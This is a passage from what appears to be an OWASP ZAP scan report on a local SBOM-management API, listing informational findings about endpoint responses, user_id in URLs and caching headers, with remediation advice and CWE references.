  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/validate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/validate/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/validate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/settings
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/settings ()({enabled,api_endpoint,api_key,clear_api_key,download_feeds_enabled,page_size,window_days,min_freshness_hours})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/settings/
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/settings/ ()({enabled,api_endpoint,api_key,clear_api_key,download_feeds_enabled,page_size,window_days,min_freshness_hours})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key ()({enabled,priority,base_url,feed_urls:[],config:{},timeout_seconds,max_retries,circuit_breaker_enabled,cache_ttl_known_days,cache_ttl_unknown_hours,cache_ttl_failure_minutes,cache_ttl_deprecated_days})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key ()({enabled,priority,base_url,feed_urls:[],config:{},timeout_seconds,max_retries,circuit_breaker_enabled,cache_ttl_known_days,cache_ttl_unknown_hours,cache_ttl_failure_minutes,cache_ttl_deprecated_days})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/ ()({enabled,priority,base_url,feed_urls:[],config:{},timeout_seconds,max_retries,circuit_breaker_enabled,cache_ttl_known_days,cache_ttl_unknown_hours,cache_ttl_failure_minutes,cache_ttl_deprecated_days})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret ()({secret_name,secret_value})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret ()({secret_name,secret_value})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/ ()({secret_name,secret_value})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/10
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/10 ()({vendor_name,product_name,product_aliases:[],ecosystem,version_pattern,version_start,version_end,lifecycle_status,maintenance_status,eol_date,eos_date,eof_date,deprecated,unsupported,latest_supported_version,recommended_version,evidence_url,evidence:{},confidence,enabled})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/10/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/10/ ()({vendor_name,product_name,product_aliases:[],ecosystem,version_pattern,version_start,version_end,lifecycle_status,maintenance_status,eol_date,eos_date,eof_date,deprecated,unsupported,latest_supported_version,recommended_version,evidence_url,evidence:{},confidence,enabled})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/component/10
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/component/10 ()({lifecycle_status,eos_date,eol_date,eof_date,is_deprecated,deprecated,unsupported,maintenance_status,latest_version,latest_supported_version,recommended_version,recommendation,lifecycle_recommendation,evidence_url,lifecycle_source_url,reason,note,evidence:{},updated_by})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/component/10/
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/component/10/ ()({lifecycle_status,eos_date,eol_date,eof_date,is_deprecated,deprecated,unsupported,maintenance_status,latest_version,latest_supported_version,recommended_version,recommendation,lifecycle_recommendation,evidence_url,lifecycle_source_url,reason,note,evidence:{},updated_by})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair-draft
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair-draft ()({content,base_version})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair-draft/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair-draft/ ()({content,base_version})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair-draft
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair-draft ()({content,base_version})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair-draft/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair-draft/ ()({content,base_version})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10 ()({label,api_key,base_url,default_model,tier,enabled,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local,max_concurrent,rate_per_minute})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10 ()({label,api_key,base_url,default_model,tier,enabled,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local,max_concurrent,rate_per_minute})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/ ()({label,api_key,base_url,default_model,tier,enabled,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local,max_concurrent,rate_per_minute})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/set-default
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/set-default`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/set-default/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/set-default/`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/set-fallback
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/set-fallback`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/set-fallback/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/set-fallback/`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/settings
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/settings ()({feature_enabled,kill_switch_active,budget_per_request_usd,budget_per_scan_usd,budget_daily_usd})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair-draft
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair-draft ()({content,base_version})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair-draft/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair-draft/ ()({content,base_version})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``


Instances: 932

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Information Disclosure - Sensitive Information in URL ](https://www.zaproxy.org/docs/alerts/10024/)



##### Informational (Medium)

### Description

The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.

* URL: http://host.docker.internal:8000/api/sboms%3Fuser_id=&status=&stage=&page=1&page_size=50&cursor=
  * Node Name: `http://host.docker.internal:8000/api/sboms (cursor,page,page_size,stage,status,user_id)`
  * Method: `GET`
  * Parameter: `user_id`
  * Attack: ``
  * Evidence: `user_id`
  * Other Info: `The URL contains potentially sensitive information. The following string was found via the pattern: user
user_id`
* URL: http://host.docker.internal:8000/api/projects/10/restore%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/projects/10/restore (user_id)`
  * Method: `POST`
  * Parameter: `user_id`
  * Attack: ``
  * Evidence: `user_id`
  * Other Info: `The URL contains potentially sensitive information. The following string was found via the pattern: user
user_id`
* URL: http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx (user_id)`
  * Method: `POST`
  * Parameter: `user_id`
  * Attack: ``
  * Evidence: `user_id`
  * Other Info: `The URL contains potentially sensitive information. The following string was found via the pattern: user
user_id`
* URL: http://host.docker.internal:8000/api/sboms/10/edit%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/edit (user_id)({"metadata":{},"components":[{"bom_ref":"John Doe","name":ZAP,"version":"John Doe","supplier":"John Doe","license":"John Doe","hashes":"John Doe","lifecycle":{}}],"change_summary":"Manual edit via UI"})`
  * Method: `POST`
  * Parameter: `user_id`
  * Attack: ``
  * Evidence: `user_id`
  * Other Info: `The URL contains potentially sensitive information. The following string was found via the pattern: user
user_id`
* URL: http://host.docker.internal:8000/api/sboms/10/restore/10%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/10 (user_id)`
  * Method: `POST`
  * Parameter: `user_id`
  * Attack: ``
  * Evidence: `user_id`
  * Other Info: `The URL contains potentially sensitive information. The following string was found via the pattern: user
user_id`

Instances: Systemic


### Solution

Do not pass sensitive information in URIs.

### Reference



#### CWE Id: [ 598 ](https://cwe.mitre.org/data/definitions/598.html)


#### WASC Id: 13

#### Source ID: 3

### [ Non-Storable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.

* URL: http://host.docker.internal:8000/api/analysis/config
  * Node Name: `http://host.docker.internal:8000/api/analysis/config`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle%3Fpage=1&page_size=25
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle (page,page_size)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/versions
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/versions`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/types
  * Node Name: `http://host.docker.internal:8000/api/types`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/edit%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/edit (user_id)({"metadata":{},"components":[{"bom_ref":"John Doe","name":ZAP,"version":"John Doe","supplier":"John Doe","license":"John Doe","hashes":"John Doe","lifecycle":{}}],"change_summary":"Manual edit via UI"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `authorization:`
  * Other Info: ``

Instances: Systemic


### Solution

The content may be marked as storable by ensuring that the following conditions are satisfied:
The request method must be understood by the cache and defined as being cacheable ("GET", "HEAD", and "POST" are currently defined as cacheable)
The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)
The "no-store" cache directive must not appear in the request or response header fields
For caching by "shared" caches such as "proxy" caches, the "private" response directive must not appear in the response
For caching by "shared" caches such as "proxy" caches, the "Authorization" header field must not appear in the request, unless the response explicitly allows it (using one of the "must-revalidate", "public", or "s-maxage" Cache-Control response directives)
In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:
It must contain an "Expires" header field
It must contain a "max-age" response directive
For "shared" caches such as "proxy" caches, it must contain a "s-maxage" response directive
It must contain a "Cache Control Extension" that allows it to be cached
It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3

### [ Session Management Response Identified ](https://www.zaproxy.org/docs/alerts/10112/)



##### Informational (High)

### Description

The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to "Auto-Detect" then this rule will change the session management to use the tokens identified.

* URL: http://host.docker.internal:8000/api/sboms/10/edit%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/edit (user_id)({"metadata":{},"components":[{"bom_ref":"John Doe","name":ZAP,"version":"John Doe","supplier":"John Doe","license":"John Doe","hashes":"John Doe","lifecycle":{}}],"change_summary":"Manual edit via UI"})`
  * Method: `POST`
  * Parameter: `user_id`
  * Attack: ``
  * Evidence: `user_id`
  * Other Info: `url:user_id`


Instances: 1

### Solution

This is an informational alert rather than a vulnerability and so there is nothing to fix.

### Reference


* [ https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id/ ](https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id/)



#### Source ID: 3

### [ Storable and Cacheable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where "shared" caching servers such as "proxy" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.

* URL: http://host.docker.internal:8000/
  * Node Name: `http://host.docker.internal:8000/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`
* URL: http://host.docker.internal:8000/health
  * Node Name: `http://host.docker.internal:8000/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`


Instances: 2

### Solution

Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:
Cache-Control: no-cache, no-store, must-revalidate, private
Pragma: no-cache
Expires: 0
This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3


